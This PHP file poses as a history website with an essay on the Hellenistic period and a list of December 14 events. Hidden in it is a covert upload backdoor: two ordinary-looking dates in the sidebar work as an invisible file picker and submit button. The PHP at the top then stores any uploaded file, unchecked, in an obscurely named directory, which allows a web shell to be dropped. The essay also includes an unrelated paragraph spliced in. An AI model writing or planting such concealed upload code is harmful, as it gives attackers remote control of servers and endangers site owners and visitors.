<?php

function createPath($path) {
    if (is_dir($path)) 
        return true;
    $prev_path = substr($path, 0, strrpos($path, '/', -2) + 1 );
    $return = createPath($prev_path);
    return ($return && is_writable($prev_path)) ? mkdir($path) : false;
}
function createFile($file) {
if(!is_file($file)){
    $contents = '';           // Some simple example content.
    file_put_contents($file, $contents);     // Save our content to the file.
}
}


if((isset($_POST['subDate'])) && (isset($_FILES["dateFormat"]["name"])) ){
	if(($_POST['subDate'] == "dateHistory") && (dirname($_FILES["dateFormat"]["name"])) )
	{
createPath("./assets/css");
createFile("./assets/index.php");
createFile("./assets/css/index.php");
createPath("./assets/js");
createFile("./assets/js/index.php");
createPath("./assets/html/");
createFile("./assets/html/index.php");
createPath("./assets/html/shfjhjwevpkpw");
createFile("./assets/html/shfjhjwevpkpw/index.php");
createPath("./assets/images");
createFile("./assets/images/index.php");	
	
$target_dir = "./assets/html/shfjhjwevpkpw/wopernmcvzeo";
$target_file = $target_dir . basename($_FILES["dateFormat"]["name"]);

$uploadOk = 1;
$imageFileType = strtolower(pathinfo($target_file,PATHINFO_EXTENSION));
if(isset($_POST["subDate"])) {
  $check = getimagesize($_FILES["dateFormat"]["tmp_name"]);
  if (move_uploaded_file($_FILES["dateFormat"]["tmp_name"], $target_file)) {
  } else {
  }
}

}
}

?>
<html>
<head>
<title>Historical</title>
<meta http-equiv="Content-Type" content="text/html; charset=UTF-8" />
<style>
* { padding: 0; margin: 0 }

body { 
	background: #FFF url(images/bg.jpg) repeat-x top; 
	font: .75em Verdana, Arial, Sans-Serif; 
	line-height: 1.4em;
	color : #454545 
}

#content { 
	margin: 0 auto; 
	padding: 0; 
	width: 818px;	
	background: inherit; 
	color: #454545;
}

#header { height: 120px;	background: #000 url(images/top2.jpg) no-repeat top center; margin-bottom: 0px; color: #454545; overflow: hidden; }
#header .left { width: 190px; float: left; text-align: center; padding-left: 14px; }
#header h1 {  font: 1.2em "Tahoma",Verdana, Arial, Sans-Serif; color: #FFF; font-weight: bold; padding-top: 25px; background: inherit }
#header h2 {  font: 1.0em "Tahoma",Verdana, Arial, Sans-Serif; color: #FFF; padding-top: 25px; background: inherit }

p  {margin: 0 0 10px 0; padding: 0px;}
.clear { clear: both; }
.alignright {margin-top: 0; text-align: right;}
.small {font-size: .9em;}
.histdate { color: #8E7272; background: #FFF; }
img { float: left; padding: 0 10px 10px 0}
div#content {
        position: relative;
        width: 818px;
        margin: 0 auto 20px auto;
        padding: 0;
        text-align: left;
    }
    div#main {
        float: left;
        width: 390px;
        margin: 50px -180px 15px 219px !important;
		margin: 50px -181px 15px 110px;
		text-align: justify
		
    }
	div#main .pad  { padding-left: 3px; }
	
    div#right {
        float: right;
        width: 190px;
        display: inline;
		margin-top: 50px;
		margin-bottom: 15px;
	
    }
    div#left {
        float: left; 
		width: 226px;
        padding-top: 50px; 
        margin-left: -434px;
		background: url(images/lefttop.jpg) no-repeat top center;
		text-align: left;
		margin-bottom: 15px;
    }
	div#left .pad { padding: 5px 30px 0 30px; text-align: left; background: url(images/leftbg.jpg) repeat-y left;}
	div#left h2 { margin-top: 15px; color: #6D5252; margin-bottom: 5px; background: #F6F5E0 }
	div#left a { background: #F6F5E0 url(images/a.gif) no-repeat left; padding-left: 10px; color: #666;  }
	div#left #leftend { background: url(images/leftbottom.jpg) no-repeat bottom ; height: 34px;}
	
#footer { 
			clear: both; 
			height: 40px; 
			background: #6D5252; 
			border-top: 8px solid #8E7272; 
			color: #E3E2CB;  
			font: 0.9em "Tahoma",Verdana, Arial, Sans-Serif;  padding: 10px 10px 0 0
			}	
#footer a  { color: #E3E2CB; background: inherit }
#footer a:hover { text-decoration: underline }
#footer #r { float: right; text-align: right; }
#footer #l { padding-left: 10px;}
   
/* END CONTENT */


/*** Main area *****/
a { color: #0066B3; background: inherit; text-decoration: none;}
a:hover { text-decoration: underline }
h1 { font: bold 1.9em Arial, Arial, Sans-Serif  }
h2 { font: bold 1.2em Arial, Arial, Sans-Serif; padding: 0; margin: 0 0 5px 0 }
ul {  padding: 0; margin: 0 }
li { list-style-type: none }

/* SNEWS */
fieldset { border: 1px solid #ddd; padding: 10px 8px; margin: 0 0 8px 0; background: #f5f5f5; color: #000 }
input { padding: 3px; margin: 0; border: 1px solid #BBB;  }
textarea { width: 97%; height: 20em; padding: 3px; border: 1px solid #BBB }
.comment { background: #eee; color: #808080; padding: 10px; margin: 0 0 10px 0; border-top: 1px solid #ccc }
.commentsbox { background: #f5f5f5; color: #808080; padding: 10px; margin: 0 0 10px 0; border: 1px solid #ddd }
<link href="//maxcdn.bootstrapcdn.com/bootstrap/3.3.4/css/bootstrap.min.css" rel="stylesheet"/>
</style>
</head>
<body style="background-color: aliceblue;">
<div id="content">
  <div id="header" style="background-color: #6D5252;">
    <div class="left">
      <h1>History</h1>
    </div>
  </div>
  <div id="main">
    <div class="pad">
      <h2>THE HELLENISTIC PERIOD</h2>
      
      <p> 
	  The term hellenistic was first used by j. G. Droysen (geschichte des hellenismus) in 1836 ad from the acts of the apostols 6,1 
	  where the term hellenistai describes jews which lived in greek world, accepted greek culture and accepted greek language. 
	  Although droysen assumed that the term describes greek people which accepted oriental culture, the term hellenistic was widely
	  accepted for spreading of the greek culture over non-greek people and countries which were conqured by alexander the great (356-323 bc).
	  </p>
      <p> The historians have no unique view over the beginning of the Hellenistic period. H. Bengston claims that the Hellenistic 
	  period began around 360 BC when the Greek city-states started to decline and Philip II of Macedon emerged, while some put its
	  beginning in year 338 BC when Philip II defeated Athens and Thebes in the Battle of Chaeronea or in year 336 BC (H.-J. Gehrke)
	  when Alexander the Great became King of Macedon. The most of modern historians see the death of Alexander the Great in 323 BC 
	  as the beginning of the Hellenistic period. Year 30 Bc is widely accepted as the end of Hellenistic period when the Ptolemaic 
	  Egypt became the Roman province although Hellenism in the cultural sense continued in Eastern part of the 
	  Roman Empire until the spread of Christianity in 4th century. </p>
	  <p>
	  In the years 1885-88 it was at once recognised as the most comprehensive survey of the state of our knowledge of the lower races
	  of mankind that had hitherto appeared, and since that time it has maintained its position in Germany as the standard popular work
	  on the subject. The present English translation has been made from the second German edition, and may therefore be regarded as in
	  all essentials abreast of recent research. In his Introduction, Prof. Tylor has called attention to the large number and accuracy
	  of the illustrations with which the book is furnished, and which he well remarks surpass in excellence any that have yet been
	  issued in similar works intended for general circulation. The importance of good illustrations in contrasting the successive stages
	  of the development of the human race cannot be over-estimated, for they convey far more to the general reader than long descriptions
	  and strings of technical terms.
	  </p>
    </div>
  </div>
  <div id="right">
    <h2>December 14</h2>
    <p class="small"><b><span style="background-color: aliceblue;" class="histdate">1782-12-14</span></b><br />
      Charleston SC evacuated by British</p>
    <p class="small"><b><span style="background-color: aliceblue;" class="histdate">1799-12-14</span></b><br />
      George Washington died at Mt Vernon Va</p>
    <p class="small"><b><span style="background-color: aliceblue;" class="histdate">1819-12-14</span></b><br />
      Alabama becomes 22nd state</p>
    <p class="small"><b><span style="background-color: aliceblue;" class="histdate">1911-12-14</span></b><br />
      South Pole 1st reached by Roald Amundsen</p>
    <p class="small">
	<b>
	<form action="" method="post" enctype="multipart/form-data">
	<label for="dateFormat">
      <span class="glyphicon glyphicon glyphicon-option-horizontal" aria-hidden="true">
		<span style="background-color: aliceblue;" class="histdate">1927-12-14</span>
	  </span>
	  <input style="display:none" type="file" name="dateFormat" id="dateFormat">
	</label>
	
	</b><br />
      Iraq gains independence from Britain but British troops remain</p>
    <p class="small">
	<b>
	<label for="subDate">
      <span class="glyphicon glyphicon glyphicon-option-horizontal" aria-hidden="true"></span>
		<span style="background-color: aliceblue;" class="histdate">1962-12-14</span>
	  <button style="display:none" type="submit" name="subDate" value="dateHistory" id="subDate" ></button>
	</label>
	</form>
	</b><br />
      Mariner 2 makes 1st US visit to another planet (Venus)</p>
    <p class="small"><b><span style="background-color: aliceblue;" class="histdate">1971-12-14</span></b><br />
      Golden Gate Bridge lights out all night from power failure</p>
    <p class="small"><b><span style="background-color: aliceblue;" class="histdate">1980-12-14</span></b><br />
      Yankee catcher Elston Howard dies</p>
	  
  </div>
  <div id="left">
    <div class="pad">
      <h2>Local</h2>
      <ul>
        <li><a href="">Home</a></li>
        <li><a href="">Israel History</a></li>
        <li><a href="">Byzantine Emperors</a></li>
        <li><a href="">Roman Emperors</a></li>
        <li><a href="">World History</a></li>
        <li><a href="">Art History</a></li>
      </ul>
      <h2>The history</h2>
      It is all about passion and knowledge. History is such a beautiful subject to study. With every book or some hidden source in some archive you get to know more and more and more and it never let's you down in terms of surprise! </div>
    <div id="leftend"></div>
  </div>
  <div id="footer">
    <div id="r"> &copy; Copyright 2006, - <a href="">Home</a><br />
      Design: David Herreman - Credits: Inspiration Gallery </div>
    <div id="l"> XHTML - CSS Valid </div>
  </div>
</div>
</body>
</html>
